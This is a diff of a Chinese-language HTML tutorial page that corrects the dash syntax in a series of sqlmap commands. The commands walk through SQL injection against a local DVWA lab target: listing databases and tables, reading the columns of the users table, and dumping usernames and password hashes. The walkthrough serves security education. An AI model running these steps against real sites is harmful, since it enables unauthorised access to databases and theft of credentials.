@@ -140,19 +140,19 @@
 <br>
 
 <h3 id="使用-SQLMAP-查看数据库"><a href="#使用-SQLMAP-查看数据库" class="headerlink" title="使用 SQLMAP 查看数据库"></a>使用 SQLMAP 查看数据库</h3><blockquote>
-<p>sqlmap.py -u “<a href="http://localhost/diy/sqli.php?id=1&quot;" target="_blank" rel="noopener">http://localhost/diy/sqli.php?id=1&quot;</a> –dbs</p>
+<p>sqlmap.py -u “<a href="http://localhost/diy/sqli.php?id=1&quot;" target="_blank" rel="noopener">http://localhost/diy/sqli.php?id=1&quot;</a> --dbs</p>
 </blockquote>
 <p><img src="dbs.jpg" alt="dbs"></p>
 <br>
 
 <h3 id="使用-SQLMAP-查看当前数据库"><a href="#使用-SQLMAP-查看当前数据库" class="headerlink" title="使用 SQLMAP 查看当前数据库"></a>使用 SQLMAP 查看当前数据库</h3><blockquote>
-<p> sqlmap.py -u “<a href="http://localhost/diy/sqli.php?id=1&quot;" target="_blank" rel="noopener">http://localhost/diy/sqli.php?id=1&quot;</a> –current-db</p>
+<p> sqlmap.py -u “<a href="http://localhost/diy/sqli.php?id=1&quot;" target="_blank" rel="noopener">http://localhost/diy/sqli.php?id=1&quot;</a> --current-db</p>
 </blockquote>
 <p><img src="currentdb.jpg" alt="currentdb"></p>
 <br>
 
 <h3 id="使用-SQLMAP-爆出数据库-dvwa-中的表"><a href="#使用-SQLMAP-爆出数据库-dvwa-中的表" class="headerlink" title="使用 SQLMAP 爆出数据库(dvwa)中的表"></a>使用 SQLMAP 爆出数据库(dvwa)中的表</h3><blockquote>
-<p>sqlmap.py -u “<a href="http://localhost/diy/sqli.php?id=1&quot;" target="_blank" rel="noopener">http://localhost/diy/sqli.php?id=1&quot;</a> –table -D “dvwa”</p>
+<p>sqlmap.py -u “<a href="http://localhost/diy/sqli.php?id=1&quot;" target="_blank" rel="noopener">http://localhost/diy/sqli.php?id=1&quot;</a> --table -D “dvwa”</p>
 </blockquote>
 <p><img src="tables.jpg" alt="dvwa"></p>
 <br>
@@ -162,13 +162,13 @@
 <br>
 
 <h3 id="使用-SQLMAP-爆出表-users-的列"><a href="#使用-SQLMAP-爆出表-users-的列" class="headerlink" title="使用 SQLMAP 爆出表(users)的列"></a>使用 SQLMAP 爆出表(users)的列</h3><blockquote>
-<p>sqlmap.py -u “<a href="http://localhost/diy/sqli.php?id=1&quot;" target="_blank" rel="noopener">http://localhost/diy/sqli.php?id=1&quot;</a> –columns -T “users” -D “dvwa”</p>
+<p>sqlmap.py -u “<a href="http://localhost/diy/sqli.php?id=1&quot;" target="_blank" rel="noopener">http://localhost/diy/sqli.php?id=1&quot;</a> --columns -T “users” -D “dvwa”</p>
 </blockquote>
 <p><img src="columns.jpg" alt="columns"></p>
 <br>
 
 <h3 id="使用-SQLMAP-破解账户密码值"><a href="#使用-SQLMAP-破解账户密码值" class="headerlink" title="使用 SQLMAP 破解账户密码值"></a>使用 SQLMAP 破解账户密码值</h3><blockquote>
-<p>sqlmap.py -u “<a href="http://localhost/diy/sqli.php?id=1&quot;" target="_blank" rel="noopener">http://localhost/diy/sqli.php?id=1&quot;</a> –dump -C “user,password,user_id” -T “users” -D “dvwa”</p>
+<p>sqlmap.py -u “<a href="http://localhost/diy/sqli.php?id=1&quot;" target="_blank" rel="noopener">http://localhost/diy/sqli.php?id=1&quot;</a> --dump -C “user,password,user_id” -T “users” -D “dvwa”</p>
 </blockquote>
 <p><img src="crack_md5.jpg" alt="crack_md5"></p>
 <br>
